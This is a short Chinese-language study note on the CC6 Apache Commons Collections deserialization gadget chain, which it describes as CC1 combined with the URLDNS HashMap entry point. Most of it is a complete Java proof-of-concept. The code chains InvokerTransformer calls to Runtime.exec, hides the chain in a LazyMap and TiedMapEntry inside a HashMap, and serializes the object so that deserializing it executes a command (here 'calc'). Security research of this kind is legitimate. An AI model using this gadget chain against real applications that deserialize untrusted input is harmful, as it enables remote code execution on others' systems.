CC6=CC1+URLDNS

这条链是基于CC1，只是入口类改了，入口类为hashMap，触发HashMap.readObject()。
由DNSURL那条链可知，HashMap.readObject()有putValue中对key的hash，会触发hashCode方法。

如果某个类中的HashCode方法有get方法，那就接上了CC1链。
得到TiedMapEntry中的HashCode调用了getValue()，getVaule中调了get。

## **验证**
```
public class POC {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(Runtime.class), 
        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}), 
        new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,null}), 
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}) 
}; 
        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers); 
        HashMap<Object,Object> hashMap=new HashMap<>(); 
        Map<Object,Object> decoratemap= LazyMap.decorate(hashMap,new ConstantTransformer(1)); 
        TiedMapEntry tiedMapEntry=new TiedMapEntry(decoratemap,"aaa"); 
        HashMap<Object,Object> map2=new HashMap<>(); 
        map2.put(tiedMapEntry,"sss"); 
        decoratemap.remove("aaa"); 
        Class c=decoratemap.getClass(); 
        Field factory=c.getDeclaredField("factory"); 
        factory.setAccessible(true); 
        factory.set(decoratemap,chainedTransformer);

        serialize(map2);
        unserialize("ser1.bin");
    }

    public static void serialize(Object obj) throws IOException, IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser1.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```
